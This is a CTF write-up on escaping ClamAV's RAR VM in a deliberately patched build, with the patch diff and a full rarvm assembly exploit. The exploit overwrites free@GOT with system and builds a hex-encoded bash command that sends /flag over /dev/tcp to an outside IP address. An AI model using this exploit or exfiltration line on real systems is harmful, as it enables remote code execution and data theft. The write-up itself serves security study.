## Real World CTF 2019

This year's real world CTF was really awesome. It had several improvements from last year. (challenges had more directions and hints, crypto and reverse challenges introduced) I spent a lot of time on Fuchsia IPC reversing (`cai-dan-ti-1`) and peeking at recent PHP commit logs (`MoP`) but I coudldn't solve any of them, which is sad. I managed to solve only one challenge, `anti-anti-virus`. Here is my write-up.

Also, just in case you're curious the pwnables that came out were based on the following topics:<br>
<1> cai-dan-ti (1,2): Reversing-Shellcoding-Pwning on Google Fuchsia<br>
<2> Dezhou Instruments: Pwning an iPhone application<br>
<3> MoP: exploiting a PHP memory corruption bug to bypass `base_dir` and `disable_function` to achieve full RCE.<br>
<4> Across the Great Wall: exploiting a userland proxy<br>
<5> faX senDeR: some userland pwanble related to XDR, I don't really know much<br>
<6> accessible & appetizer: Browser exploitation challenges<br>


## Analysis
We are given a lot of shared library files, two binaries (`clamscan` and `clamdscan`), a readme and a patch.diff file. The readme states that the two binaries were built on version commit ID `6c11e824a794770c469f3a46141d5ea7927b6ea6`, and applied the given patch.diff file. We can actually build clam ourselves, by doing 
```bash
git clone https://github.com/Cisco-Talos/clamav-devel
git reset --hard 6c11e824a794770c469f3a46141d5ea7927b6ea6
apply -s -p1 < ../patch.diff
```

ClamAV is an open source virus scanner. What we should do is to get full RCE when ClamAV is given a file to scan. At first I thought the challenge would be really hard, because the clamscan binary had all protections (PIE, NX, Full RELRO, FORTIFY) enabled and we need to get a reverse shell (the server does not show any output, and leaking the flag bit by bit via time-based approach is not possible due to PoW) without any interactions. It is hard to bypass ASLR in an interactionless-exploit unless the given primitive is really powerful. 

I took a look at the patch file, and spotted mainly two things.<br>
<1> Some structure members' size increased from 4 bytes to 8 bytes. Theoretically, this should not introduce any bugs, but I guess the intention was to make exploitation easier, since in 64bit userspace applications pointers are 8 bytes.<br>
<2> I spotted something that looks like a bounds check elimination. I guessed this is the root bug.<br>

All the patches were done on a file called rarvm.c. RAR is a file format for archiving data. How is VM (Virutal Machine) supposed to be related to it? At first I thought that it was a sandboxed executor for binaries inside the archived rar file. I started analyzing the source code but couldn't understand what rar vm really is. 

After getting some sleep, I google searched about RAR vm. It showed a very old [CVE](https://www.cvedetails.com/cve/CVE-2007-3725/) on ClamAV, which seemed kinda relevant. Also I spotted a [blogpost](http://blog.cmpxchg8b.com/2012/09/fun-with-constrained-programming.html) about rarVM. WTF? RAR has support for custom bytecode, and unrar'ing programs execute them? How surprising. 

I also found [this](https://github.com/taviso/rarvmtools) repository, which implemented a linker and assembler for rar files. I think it was super cool. I decided to use it when constructing my exploit.

Now, I get the point of the challenge: escape the implemented rar VM executor and get RCE

## Exploitation
The bounds check elimination in the patch is the following:
```
-		return ((unsigned int *)&rarvm_data->mem[(*cmd_op->addr+cmd_op->base) & RARVM_MEMMASK]);
+		/* return ((unsigned int *)&rarvm_data->mem[(*cmd_op->addr+cmd_op->base) & RARVM_MEMMASK]); */
+		return ((size_t *)&rarvm_data->mem[(*cmd_op->addr+cmd_op->base) /*& RARVM_MEMMASK*/]);
```
Basically it is a piece of code that translates RAR VM memory addresses to real memory addresses. Originally. the RAR VM memory address was confined from range 0 ~ 0x3fffff. (RARVM_MEMMASK = 0x3fffff) However, the masking is eliminated, so we can access arbitrary addresses relative to `rarvm_data->mem`. With the help of a debugger, I found that mem points to an mmapped chunk address, so we can access all the libraries through it, since libraries are also loaded via mmap and have constant distances from mmapped chunks. My idea was to access the free@GOT of libunrar.so, read the lower 4 bytes, subtract an adequate value so that the 4 bytes are equal to the lower 4 bytes of system, and place those 4 bytes back at free@GOT.

Also, the `mem` pointer must be freed at some point, so I wrote code so that it places commands at the start of `mem`. The start of `mem` can be accessed by the VM address 0. I wrote a helper script, `encode_cmd.py` that generates an assembly code that does this. To prevent the commandline string from overwriting running code, I padded the start with a bunch of NOP sequences. Here is my full exploit.

```
#include <constants.rh>
#include <util.rh>
#include <math.rh>
#include <crctools.rh>

_start:
	; Install our message in the output buffer
	mov r3, #0x0
	add r3, #0x1622bff0 ; offset between unrar start and mmap chunk
	add r3, #0x20C018
	mov r4, [r3]
	sub r4, #296208
	mov [r3], r4 ; change free to system
	mov r3, #0x0
	mov r3, #0x0
	mov r3, #0x0
	mov r3, #0x0
	mov r3, #0x0
	mov r3, #0x0
	mov r3, #0x0
	mov r3, #0x0
	mov r3, #0x0
	mov r3, #0x0
	mov r3, #0x0
	mov r3, #0x0
	mov r3, #0x0
	mov r3, #0x0
	mov r3, #0x0
	mov r3, #0x0
	mov r3, #0x0
	mov r3, #0x0
	mov r3, #0x0
	mov r3, #0x0
	mov r3, #0x0
	mov r3, #0x0
	mov r3, #0x0
	mov r3, #0x0
	mov r3, #0x0
	mov r3, #0x0
	mov r3, #0x0
	
	mov [r3+#0], #0x6e69622f
	mov [r3+#4], #0x7361622f
	mov [r3+#8], #0x632d2068
	mov [r3+#12], #0x2f282220
	mov [r3+#16], #0x2f6e6962
	mov [r3+#20], #0x20746163
	mov [r3+#24], #0x616c662f
	mov [r3+#28], #0x202f2067
	mov [r3+#32], #0x31263e32
	mov [r3+#36], #0x203e2029
	mov [r3+#40], #0x7665642f
	mov [r3+#44], #0x7063742f
	mov [r3+#48], #0x322e312f
	mov [r3+#52], #0x352e3535
	mov [r3+#56], #0x33362e34
	mov [r3+#60], #0x3939392f
	mov [r3+#64], #0x2238
	call $_success
```

Now using rarvmtools, compile this assembly file (it feels weird to do `make paylaod.rar`!) and upload it. It sends the flag to my listening server.

